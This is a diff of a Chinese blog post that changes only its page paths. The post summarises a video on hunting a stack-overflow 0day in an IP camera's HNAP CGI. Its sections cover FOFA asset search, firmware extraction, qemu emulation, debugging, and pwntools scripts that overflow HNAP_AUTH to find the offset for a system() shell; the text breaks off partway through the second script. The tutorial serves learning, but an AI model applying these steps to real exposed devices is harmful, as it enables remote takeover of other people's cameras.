@@ -22,36 +22,36 @@
     <meta name="description" content="​	总结实操一下pwn_bug师傅的视频（b站）。只是为了学习总结，侵权必删。 这里也贴一下该师傅的视频链接： 【二进制安全 摄像头0day漏洞挖掘入门第一课-哔哩哔哩】 https:&#x2F;&#x2F;b23.tv&#x2F;KeqObCW 前置fofa上搜索一下设备型号进行资产探测，判断是否有寻找该设备利用的价值。 （注意路由器ip地址会变的问题）     获取并分析固件直接上搜索引擎搜索寻找     解压缩得到相应b">
 <meta property="og:type" content="article">
 <meta property="og:title" content="pwn_bug视频总结">
-<meta property="og:url" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/index.html">
+<meta property="og:url" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/index.html">
 <meta property="og:site_name" content="bsahfm">
 <meta property="og:description" content="​	总结实操一下pwn_bug师傅的视频（b站）。只是为了学习总结，侵权必删。 这里也贴一下该师傅的视频链接： 【二进制安全 摄像头0day漏洞挖掘入门第一课-哔哩哔哩】 https:&#x2F;&#x2F;b23.tv&#x2F;KeqObCW 前置fofa上搜索一下设备型号进行资产探测，判断是否有寻找该设备利用的价值。 （注意路由器ip地址会变的问题）     获取并分析固件直接上搜索引擎搜索寻找     解压缩得到相应b">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220652114.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220937505.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507222755267.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508101841333.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508102820567.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508103343256.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508104615256.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508104635567.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508112343568.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508113815288.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508194534099.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508203714997.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512172645536.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174010532.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174417431.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174527903.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512180635545.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512180745536.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512181621569.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512184347172.png">
-<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512190929579.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220652114.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220937505.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507222755267.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508101841333.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508102820567.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508103343256.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508104615256.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508104635567.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508112343568.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508113815288.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508194534099.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508203714997.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512172645536.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174010532.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174417431.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174527903.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512180635545.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512180745536.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512181621569.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512184347172.png">
+<meta property="og:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512190929579.png">
 <meta property="article:published_time" content="2026-05-07T13:44:58.000Z">
 <meta property="article:modified_time" content="2026-05-12T11:15:31.977Z">
 <meta property="article:author" content="bsahfm">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="https://yy-t1.github.io/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220652114.png">
+<meta name="twitter:image" content="https://yy-t1.github.io/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220652114.png">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
@@ -326,19 +326,19 @@
 <p>【二进制安全 摄像头0day漏洞挖掘入门第一课-哔哩哔哩】 <a target="_blank" rel="noopener" href="https://b23.tv/KeqObCW">https://b23.tv/KeqObCW</a></p>
 <h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><h3 id="fofa上搜索一下设备型号"><a href="#fofa上搜索一下设备型号" class="headerlink" title="fofa上搜索一下设备型号"></a>fofa上搜索一下设备型号</h3><p>进行资产探测，判断是否有寻找该设备利用的价值。</p>
 <p>（注意路由器ip地址会变的问题）</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220652114.png" srcset="/img/loading.gif" lazyload class="" title="image-20260507220652114">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220652114.png" srcset="/img/loading.gif" lazyload class="" title="image-20260507220652114">
 
 
 
 <h3 id="获取并分析固件"><a href="#获取并分析固件" class="headerlink" title="获取并分析固件"></a>获取并分析固件</h3><p>直接上搜索引擎搜索寻找</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220937505.png" srcset="/img/loading.gif" lazyload class="" title="image-20260507220937505">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507220937505.png" srcset="/img/loading.gif" lazyload class="" title="image-20260507220937505">
 
 
 
 <p>解压缩得到相应bin文件，放入对应kali</p>
 <figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">binwalk：</span><br><span class="hljs-keyword"></span>自动识别，提取固件里的文件系统等数据<br><br><span class="hljs-keyword">binwalk </span>-e 文件名<br>（root下执行会报错，说是有“恶意样本利用解包器 RCE”）<br></code></pre></td></tr></table></figure>
 
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507222755267.png" srcset="/img/loading.gif" lazyload class="" title="image-20260507222755267">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260507222755267.png" srcset="/img/loading.gif" lazyload class="" title="image-20260507222755267">
 
 
 
@@ -354,7 +354,7 @@
 
 <h3 id="对cgi进行分析"><a href="#对cgi进行分析" class="headerlink" title="对cgi进行分析"></a>对cgi进行分析</h3><p>对程序挨个挨个看，逆向比较简单。</p>
 <p>任选一个程序，在公网上访问一下。（以hnap为例）</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508101841333.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508101841333">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508101841333.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508101841333">
 
 
 
@@ -362,19 +362,19 @@
 <figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nsis">sprintf<br><br><span class="hljs-keyword">strcpy</span>：<br><span class="hljs-keyword">strcpy</span>（dest，src）<br>一旦dest&lt;src，那么就造成了栈溢出<br><br><span class="hljs-params">system</span><br></code></pre></td></tr></table></figure>
 
 <p>点击function，再按ctrl+f搜索，选中按x</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508102820567.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508102820567">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508102820567.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508102820567">
 
 
 
 <h3 id="找到可疑溢出点"><a href="#找到可疑溢出点" class="headerlink" title="找到可疑溢出点"></a>找到可疑溢出点</h3><p>env是用户可控的，而haystack在栈上是有限的</p>
 <figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">char haystack[<span class="hljs-number">256</span>]<span class="hljs-comment">;</span><br><br><span class="hljs-attribute">env</span> <span class="hljs-operator">=</span> getenv(<span class="hljs-string">&quot;HNAP_AUTH&quot;</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508103343256.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508103343256">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508103343256.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508103343256">
 
 <p>所以可能会导致栈溢出。</p>
-<h3 id="分析进入危险函数的逻辑"><a href="#分析进入危险函数的逻辑" class="headerlink" title="分析进入危险函数的逻辑"></a>分析进入危险函数的逻辑</h3><img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508104615256.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508104615256">
+<h3 id="分析进入危险函数的逻辑"><a href="#分析进入危险函数的逻辑" class="headerlink" title="分析进入危险函数的逻辑"></a>分析进入危险函数的逻辑</h3><img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508104615256.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508104615256">
 
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508104635567.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508104635567">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508104635567.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508104635567">
 
 <p>（边分析边注释）</p>
 <h2 id="实战调试"><a href="#实战调试" class="headerlink" title="实战调试"></a>实战调试</h2><h3 id="模拟环境"><a href="#模拟环境" class="headerlink" title="模拟环境"></a>模拟环境</h3><p>观察程序执行流是否符合预期</p>
@@ -382,12 +382,12 @@
 <p>但是mips指令无法在x86架构下执行，所以我们需要qemu虚拟机来运行。</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">用qemu模拟运行该程序<br>（在固件根目录里面）<br><span class="hljs-built_in">which</span> qemu-mips<br><span class="hljs-built_in">cp</span> /usr/bin/qemu-mips ./<br><span class="hljs-built_in">sudo</span> <span class="hljs-built_in">chroot</span> . ./bin/sh<br><span class="hljs-built_in">ls</span><br></code></pre></td></tr></table></figure>
 
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508112343568.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508112343568">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508112343568.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508112343568">
 
 <p>到这里就可以初步通过设置环境变量来调试该cgi程序。</p>
 <figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs arcade"><span class="hljs-keyword">export</span> REQUEST_METHOD=<span class="hljs-string">&quot;POST&quot;</span><br><span class="hljs-keyword">export</span> SOAP_ACTION=<span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">export</span> COOKIE=<span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-keyword">export</span> CONTENT_LENGTH=<span class="hljs-string">&quot;262&quot;</span><br><span class="hljs-keyword">export</span> HNAP_AUTH=<span class="hljs-number">512</span>*<span class="hljs-string">&quot;a&quot;</span>  <span class="hljs-comment">//错误的，需要借助python直接写500个a</span><br><br></code></pre></td></tr></table></figure>
 
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508113815288.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508113815288">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508113815288.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508113815288">
 
 <p>发生错误，接着就可以去调试试试了。</p>
 <h3 id="调试程序"><a href="#调试程序" class="headerlink" title="调试程序"></a>调试程序</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">开启远程调试端口，以<span class="hljs-number">1</span>.txt为输入<br>.<span class="hljs-regexp">/qemu-mips -g 1234 /</span>web<span class="hljs-regexp">/cgi-bin/</span>hnap<span class="hljs-regexp">/hnap_service &lt; /</span><span class="hljs-number">1</span>.txt<br><br>很奇怪的是一开始不知道为啥程序好像直接略过我的断点了，直接运行到结束了，但是后面多试了几次之后就又好了<br></code></pre></td></tr></table></figure>
@@ -395,7 +395,7 @@
 <p>IDA通过远程调试端口连接</p>
 <figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs">F9运行至断点处<br><br><br><br></code></pre></td></tr></table></figure>
 
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508194534099.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508194534099">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508194534099.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508194534099">
 
 
 
@@ -412,7 +412,7 @@
 
 <p>记得修改content_length,忘记改了我说怎么改来改去都不对。</p>
 <p>然后就可以设置<code>HNAP_AUTH</code>来触发栈溢出了</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508203714997.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508203714997">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260508203714997.png" srcset="/img/loading.gif" lazyload class="" title="image-20260508203714997">
 
 <p>成功溢出</p>
 <p>(接下来就是控制执行流实现远程RCE了)</p>
@@ -423,44 +423,44 @@
 
 <p>这里的AUTH其实字节数不够，失败了，还是得多一点才行</p>
 <p>而且IDA不熟练，最后还是用gdb找到具体一些问题。</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512172645536.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512172645536">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512172645536.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512172645536">
 
 
 
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置根目录 (构造 Chroot 监牢环境)</span><br>os.chroot(<span class="hljs-string">&quot;.&quot;</span>) <br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br><br><span class="hljs-comment"># 使用 b&quot;&quot;&quot;...&quot;&quot;&quot; 定义多行字节字符串</span><br>http_body = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-string">&lt;soap:Envelope</span><br><span class="hljs-string">    xmlns:soap=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;</span><br><span class="hljs-string">    xmlns:a=&quot;http://purenetworks.com/HNAP1/&quot;&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &lt;soap:Body&gt;</span><br><span class="hljs-string">        &lt;a:AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA /&gt;</span><br><span class="hljs-string">    &lt;/soap:Body&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/soap:Envelope&gt;&quot;&quot;&quot;</span><br><br><span class="hljs-comment"># 模拟 CGI 环境变量</span><br>REQUEST_METHOD = <span class="hljs-string">&quot;POST&quot;</span><br>SOAP_ACTION = <span class="hljs-string">&quot;1&quot;</span><br>COOKIE = <span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-comment"># 注意：在真实的 HTTP 请求中，CONTENT_LENGTH 应该与 http_body 的真实长度一致</span><br>CONTENT_LENGTH = <span class="hljs-built_in">str</span>(<span class="hljs-built_in">len</span>(http_body)) <br><br><span class="hljs-comment"># 触发栈溢出的 Payload (De Bruijn 序列)</span><br>HNAP_AUTH =<span class="hljs-string">&quot;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaakgaakhaakiaakjaakkaaklaakmaaknaakoaakpaakqaakraaksaaktaakuaakvaakwaakxaakyaakzaalbaalcaaldaaleaalfaalgaalhaaliaaljaalkaallaalmaalnaaloaalpaalqaalraalsaaltaaluaalvaalwaalxaalyaal  aaaaaa&quot;</span><br><br><span class="hljs-comment"># 启动程序并注入环境变量和输入流</span><br>subprocess.run(<br>    [<span class="hljs-string">&#x27;/qemu-mips&#x27;</span>, <span class="hljs-string">&#x27;-g&#x27;</span>, <span class="hljs-string">&#x27;1234&#x27;</span>, <span class="hljs-string">&#x27;/web/cgi-bin/hnap/hnap_service&#x27;</span>],<br>    <span class="hljs-built_in">input</span>=http_body,  <span class="hljs-comment"># 这里传入我们定义好的 XML 字节流</span><br>    env=&#123;<br>        <span class="hljs-string">&#x27;REQUEST_METHOD&#x27;</span>: REQUEST_METHOD,<br>        <span class="hljs-string">&#x27;SOAP_ACTION&#x27;</span>: SOAP_ACTION,<br>        <span class="hljs-string">&#x27;CONTENT_LENGTH&#x27;</span>: CONTENT_LENGTH,<br>        <span class="hljs-string">&#x27;COOKIE&#x27;</span>: COOKIE,<br>        <span class="hljs-string">&#x27;HNAP_AUTH&#x27;</span>: HNAP_AUTH<br>    &#125;<br>)<br><br><br></code></pre></td></tr></table></figure>
 
 <p>找到具体返回地址位置那么就可以</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174010532.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512174010532">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174010532.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512174010532">
 
 <p>这里特别巧妙，因为S0是保存在栈上的，而延迟槽使得在调用system之前会先执行后面那一条指令，所以我们也刚好能控制a0这个参数从而成功控制system的参数getshell。</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174417431.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512174417431">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174417431.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512174417431">
 
 <p>S0在zaal位置</p>
-<img src="/2026/05/07/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174527903.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512174527903">
+<img src="/2026/05/07/Iot/pwn-bug%E8%A7%86%E9%A2%91%E6%80%BB%E7%BB%93/image-20260512174527903.png" srcset="/img/loading.gif" lazyload class="" title="image-20260512174527903">
 
 <p>cyclic -l需要注意大小端序，不同的话计算结果是不同的。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br><span class="hljs-comment"># 设置根目录 (构造 Chroot 监牢环境)</span><br>os.chroot(<span class="hljs-string">&quot;.&quot;</span>) <br>os.chdir(<span class="hljs-string">&quot;/&quot;</span>)<br><br><span class="hljs-comment"># 使用 b&quot;&quot;&quot;...&quot;&quot;&quot; 定义多行字节字符串</span><br>http_body = <span class="hljs-string">b&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="hljs-string">&lt;soap:Envelope</span><br><span class="hljs-string">    